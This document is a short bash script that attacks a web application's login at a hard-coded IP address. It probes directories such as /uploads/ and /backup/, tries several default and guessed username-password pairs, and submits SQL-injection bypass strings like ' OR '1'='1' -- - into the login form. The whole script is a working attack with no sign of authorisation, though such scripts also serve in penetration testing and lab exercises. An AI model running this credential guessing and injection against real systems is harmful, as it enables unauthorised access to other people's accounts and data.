#!/bin/bash
T=162.212.179.67
B="http://$T:8088"
echo "=== login.php body"
curl -s -m 12 "$B/login.php"
echo
echo "=== head /healthz /uploads/ /backup/ /logout.php"
for p in healthz uploads/ backup/ logout.php "login.php?next=/uploads/"; do echo "-- $p"; curl -s -m 12 -o /dev/null -D - "$B/$p" | grep -iE "^HTTP|^Location"; done
lg(){ local u="$1" p="$2"; echo "-- login $u / $p"; curl -s -m 15 -c /tmp/cj -b /tmp/cj -o /tmp/lb -D /tmp/lh -d "username=$u&password=$p" "$B/login.php"; grep -iE "^HTTP|^Location" /tmp/lh; grep -oiE "invalid[^<]{0,60}|error[^<]{0,60}|welcome|dashboard" /tmp/lb | head -3; }
lg admin admin
lg nina nina
lg "nina@ninacdn.local" nina
lg admin password
lg admin admin123
lg nina ninamarketing
echo "=== sqli"
curl -s -m 15 -c /tmp/cj2 -b /tmp/cj2 -o /tmp/sb -D /tmp/sh --data-urlencode "username=admin' OR '1'='1' -- -" --data-urlencode "password=x" "$B/login.php"; grep -iE "^HTTP|^Location" /tmp/sh; grep -oiE "invalid[^<]{0,60}|error[^<]{0,80}" /tmp/sb | head -3
echo "=== login with admin' -- -"
curl -s -m 15 -o /tmp/sb2 -D /tmp/sh2 --data-urlencode "username=admin'-- -" --data-urlencode "password=x" "$B/login.php"; grep -iE "^HTTP|^Location" /tmp/sh2; grep -oiE "invalid[^<]{0,60}|error[^<]{0,80}" /tmp/sb2|head -2
